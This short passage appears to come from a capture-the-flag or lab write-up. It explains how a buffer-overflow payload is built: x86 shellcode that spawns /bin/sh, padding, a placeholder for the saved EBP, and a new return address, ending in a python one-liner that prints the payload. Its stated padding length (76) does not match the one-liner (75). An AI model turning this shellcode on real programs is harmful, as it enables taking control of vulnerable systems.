## Payload construction 

Our payload is divided in 3 groups:

- The first one is our shellcode and characters to fill  our buffer, 76 chars in total : </br> `"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * (76 - 28)`

- The second string is  the number of characters to access the return address (ebp + 4): </br>
`"_ebp"`

- The last one is the new malicious address : </br>
`"\x08\xa0\x04\x08"`

```
python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * (75 - 28) + "_ebp" + "\x08\xa0\x04\x08"'
```

